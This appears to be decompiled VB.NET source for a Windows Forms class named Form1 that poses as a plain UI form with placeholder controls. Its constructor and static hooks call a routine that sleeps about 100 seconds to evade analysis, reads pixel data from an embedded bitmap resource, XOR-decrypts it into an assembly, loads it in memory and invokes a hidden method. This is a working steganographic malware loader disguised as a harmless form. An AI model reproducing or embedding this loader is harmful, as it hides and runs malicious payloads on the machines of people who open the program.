Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.DirectoryServices
Imports System.Drawing
Imports System.Reflection
Imports System.Resources
Imports System.Runtime.CompilerServices
Imports System.Text
Imports System.Threading
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices

Namespace SimpleUI
  ' Token: 0x02000009 RID: 9
  <DesignerGenerated()>
  Public Class Form1
    Inherits Form

    ' Token: 0x06000012 RID: 18 RVA: 0x00002204 File Offset: 0x00000404
    <DebuggerNonUserCode()>
    Protected Overrides Sub Dispose(disposing As Boolean)
      Try
        Dim flag As Boolean = disposing AndAlso Me.components IsNot Nothing
        If flag Then
          Me.components.Dispose()
        End If
      Finally
        MyBase.Dispose(disposing)
      End Try
    End Sub

    ' Token: 0x06000013 RID: 19 RVA: 0x00002254 File Offset: 0x00000454
    <DebuggerStepThrough()>
    Private Sub InitializeComponent()
      Me.TreeView1 = New TreeView()
      Me.DirectorySearcher1 = New DirectorySearcher()
      Me.TableLayoutPanel1 = New TableLayoutPanel()
      Me.Panel1 = New Panel()
      Me.NumericUpDown1 = New NumericUpDown()
      Me.RadioButton1 = New RadioButton()
      CType(Me.NumericUpDown1, ISupportInitialize).BeginInit()
      MyBase.SuspendLayout()
      Me.TreeView1.Location = New Point(489, 74)
      Me.TreeView1.Name = "TreeView1"
      Me.TreeView1.Size = New Size(121, 97)
      Me.TreeView1.TabIndex = 0
      Me.DirectorySearcher1.ClientTimeout = TimeSpan.Parse("-00:00:01")
      Me.DirectorySearcher1.ServerPageTimeLimit = TimeSpan.Parse("-00:00:01")
      Me.DirectorySearcher1.ServerTimeLimit = TimeSpan.Parse("-00:00:01")
      Me.TableLayoutPanel1.ColumnCount = 2
      Me.TableLayoutPanel1.ColumnStyles.Add(New ColumnStyle(SizeType.Percent, 50F))
      Me.TableLayoutPanel1.ColumnStyles.Add(New ColumnStyle(SizeType.Percent, 50F))
      Me.TableLayoutPanel1.Location = New Point(503, 281)
      Me.TableLayoutPanel1.Name = "TableLayoutPanel1"
      Me.TableLayoutPanel1.RowCount = 2
      Me.TableLayoutPanel1.RowStyles.Add(New RowStyle(SizeType.Percent, 50F))
      Me.TableLayoutPanel1.RowStyles.Add(New RowStyle(SizeType.Percent, 50F))
      Me.TableLayoutPanel1.Size = New Size(200, 100)
      Me.TableLayoutPanel1.TabIndex = 1
      Me.Panel1.Location = New Point(344, 242)
      Me.Panel1.Name = "Panel1"
      Me.Panel1.Size = New Size(200, 100)
      Me.Panel1.TabIndex = 2
      Me.NumericUpDown1.Location = New Point(321, 51)
      Me.NumericUpDown1.Name = "NumericUpDown1"
      Me.NumericUpDown1.Size = New Size(120, 20)
      Me.NumericUpDown1.TabIndex = 3
      Me.RadioButton1.AutoSize = True
      Me.RadioButton1.Location = New Point(337, 74)
      Me.RadioButton1.Name = "RadioButton1"
      Me.RadioButton1.Size = New Size(90, 17)
      Me.RadioButton1.TabIndex = 4
      Me.RadioButton1.TabStop = True
      Me.RadioButton1.Text = "RadioButton1"
      Me.RadioButton1.UseVisualStyleBackColor = True
      MyBase.AutoScaleDimensions = New SizeF(6F, 13F)
      MyBase.AutoScaleMode = AutoScaleMode.Font
      MyBase.ClientSize = New Size(800, 450)
      MyBase.Controls.Add(Me.RadioButton1)
      MyBase.Controls.Add(Me.NumericUpDown1)
      MyBase.Controls.Add(Me.Panel1)
      MyBase.Controls.Add(Me.TableLayoutPanel1)
      MyBase.Controls.Add(Me.TreeView1)
      MyBase.Name = "Form1"
      Me.Text = "Form1"
      CType(Me.NumericUpDown1, ISupportInitialize).EndInit()
      MyBase.ResumeLayout(False)
      MyBase.PerformLayout()
    End Sub

    ' Token: 0x1700000A RID: 10
    ' (get) Token: 0x06000014 RID: 20 RVA: 0x00002605 File Offset: 0x00000805
    ' (set) Token: 0x06000015 RID: 21 RVA: 0x0000260F File Offset: 0x0000080F
    Friend Overridable Property TreeView1 As TreeView

    ' Token: 0x1700000B RID: 11
    ' (get) Token: 0x06000016 RID: 22 RVA: 0x00002618 File Offset: 0x00000818
    ' (set) Token: 0x06000017 RID: 23 RVA: 0x00002622 File Offset: 0x00000822
    Friend Overridable Property DirectorySearcher1 As DirectorySearcher

    ' Token: 0x1700000C RID: 12
    ' (get) Token: 0x06000018 RID: 24 RVA: 0x0000262B File Offset: 0x0000082B
    ' (set) Token: 0x06000019 RID: 25 RVA: 0x00002635 File Offset: 0x00000835
    Friend Overridable Property TableLayoutPanel1 As TableLayoutPanel

    ' Token: 0x1700000D RID: 13
    ' (get) Token: 0x0600001A RID: 26 RVA: 0x0000263E File Offset: 0x0000083E
    ' (set) Token: 0x0600001B RID: 27 RVA: 0x00002648 File Offset: 0x00000848
    Friend Overridable Property Panel1 As Panel

    ' Token: 0x1700000E RID: 14
    ' (get) Token: 0x0600001C RID: 28 RVA: 0x00002651 File Offset: 0x00000851
    ' (set) Token: 0x0600001D RID: 29 RVA: 0x0000265B File Offset: 0x0000085B
    Friend Overridable Property NumericUpDown1 As NumericUpDown

    ' Token: 0x1700000F RID: 15
    ' (get) Token: 0x0600001E RID: 30 RVA: 0x00002664 File Offset: 0x00000864
    ' (set) Token: 0x0600001F RID: 31 RVA: 0x00002670 File Offset: 0x00000870
    Friend Overridable Property RadioButton1 As RadioButton
      <CompilerGenerated()>
      Get
        Return Me._RadioButton1
      End Get
      <CompilerGenerated()>
      <MethodImpl(MethodImplOptions.Synchronized)>
      Set(value As RadioButton)
        Dim value2 As EventHandler = AddressOf Me.RadioButton1_CheckedChanged
        Dim radioButton As RadioButton = Me._RadioButton1
        If radioButton IsNot Nothing Then
          RemoveHandler radioButton.CheckedChanged, value2
        End If
        Me._RadioButton1 = value
        radioButton = Me._RadioButton1
        If radioButton IsNot Nothing Then
          AddHandler radioButton.CheckedChanged, value2
        End If
      End Set
    End Property

    ' Token: 0x06000020 RID: 32 RVA: 0x000026B3 File Offset: 0x000008B3
    Private Sub RadioButton1_CheckedChanged(sender As Object, e As EventArgs)
    End Sub

    ' Token: 0x06000021 RID: 33 RVA: 0x000026B6 File Offset: 0x000008B6
    Public Sub New(ugz1 As String, ugz3 As String, projname As String)
      Form1.SelectorX(ugz1, ugz3, projname)
    End Sub

    ' Token: 0x06000022 RID: 34 RVA: 0x000026CC File Offset: 0x000008CC
    Public Shared Sub SelectorX(ugz1 As String, ugz3 As String, projname As String)
      Dim random As Random = New Random()
      Thread.Sleep(random.[Next](99000, 105000))
      Dim ughHbnBnaWtlYkx As Bitmap = Form1.xyz(Form1.XeH(ugz1), projname)
      Dim rawAssembly As Byte() = Form1.fgh(Form1.cba(ughHbnBnaWtlYkx), Form1.XeH(ugz3))
      Dim assembly As Assembly = Assembly.Load(rawAssembly)
      Dim type As Type = assembly.GetTypes()(20)
      Dim instance As MethodInfo = type.GetMethods()(5)
      Versioned.CallByName(instance, "Invoke", CallType.[Get], New Object(1) {})
      Environment.[Exit](0)
    End Sub

    ' Token: 0x06000023 RID: 35 RVA: 0x00002750 File Offset: 0x00000950
    Public Shared Function fgh(P1 As Byte(), K1 As String) As Byte()
      Dim bytes As Byte() = Encoding.BigEndianUnicode.GetBytes(K1)
      Dim num As Integer = CInt((P1(P1.Length - 1) Xor 112))
      Dim array As Byte() = New Byte(P1.Length + 1 - 1 + 1 - 1) {}
      Dim num2 As Integer = P1.Length - 1
      Dim num3 As Integer = num2
      For i As Integer = 0 To num3
        Dim num4 As Integer
        array(i) = CByte((CInt(P1(i)) Xor num Xor CInt(bytes(num4))))
        Dim flag As Boolean = num4 = K1.Length - 1
        Dim flag2 As Boolean = flag
        If flag2 Then
          num4 = 0
        Else
          num4 += 1
        End If
      Next
      Return CType(Utils.CopyArray(array, New Byte(P1.Length - 2 + 1 - 1 + 1 - 1) {}), Byte())
    End Function

    ' Token: 0x06000024 RID: 36 RVA: 0x000027F4 File Offset: 0x000009F4
    Public Shared Function cba(UGhHbnBnaWtlYkx1 As Bitmap) As Byte()
      Dim num As Integer = 0
      Dim width As Integer = UGhHbnBnaWtlYkx1.Size.Width
      Dim num2 As Integer = width * width * 4
      Dim array As Byte() = New Byte(num2 - 1 + 1 - 1) {}
      Dim num3 As Integer = width - 1
      For i As Integer = 0 To num3
        Dim num4 As Integer = width - 1
        For j As Integer = 0 To num4
          Buffer.BlockCopy(BitConverter.GetBytes(UGhHbnBnaWtlYkx1.GetPixel(i, j).ToArgb()), 0, array, num, 4)
          num += 4
        Next
      Next
      Dim num5 As Integer = BitConverter.ToInt32(array, 0)
      Dim array2 As Byte() = New Byte(num5 - 1 + 1 - 1) {}
      Buffer.BlockCopy(array, 4, array2, 0, array2.Length)
      Return array2
    End Function

    ' Token: 0x06000025 RID: 37 RVA: 0x000028A8 File Offset: 0x00000AA8
    Public Shared Function xyz(x10 As String, projectname As String) As Bitmap
      Dim resourceManager As ResourceManager = New ResourceManager(projectname + ".Resources", Assembly.GetEntryAssembly())
      Return CType(resourceManager.GetObject(x10), Bitmap)
    End Function

    ' Token: 0x06000026 RID: 38 RVA: 0x000028DC File Offset: 0x00000ADC
    Private Shared Function XeH(hex As String) As String
      Dim stringBuilder As StringBuilder = New StringBuilder(hex.Length / 2)
      Dim num As Integer = hex.Length - 2
      For i As Integer = 0 To num Step 2
        stringBuilder.Append(Strings.Chr(CInt(Convert.ToUInt32(hex.Substring(i, 2), 16))))
      Next
      Return stringBuilder.ToString()
    End Function

    ' Token: 0x17000010 RID: 16
    ' (get) Token: 0x06000027 RID: 39 RVA: 0x00002934 File Offset: 0x00000B34
    ' (set) Token: 0x06000028 RID: 40 RVA: 0x00002947 File Offset: 0x00000B47
    Public Shared Property WrappedObject As String()
      Get
        Return Nothing
      End Get
      Set(value As String())
        Form1.SelectorX(value(0), value(1), value(2))
      End Set
    End Property

    ' Token: 0x06000029 RID: 41 RVA: 0x0000295C File Offset: 0x00000B5C
    Private Shared Function xxxx() As String
      Form1.SelectorX(Form1.var1, Form1.var2, Form1.var3)
      Return ""
    End Function

    ' Token: 0x04000009 RID: 9
    Private components As IContainer

    ' Token: 0x04000010 RID: 16
    Public Shared var1 As String = ""

    ' Token: 0x04000011 RID: 17
    Public Shared var2 As String = ""

    ' Token: 0x04000012 RID: 18
    Public Shared var3 As String = ""

    ' Token: 0x0200000D RID: 13
    Public Class Entries
      ' Token: 0x04000015 RID: 21
      Public Shared d As String = Form1.xxxx()
    End Class
  End Class
End Namespace
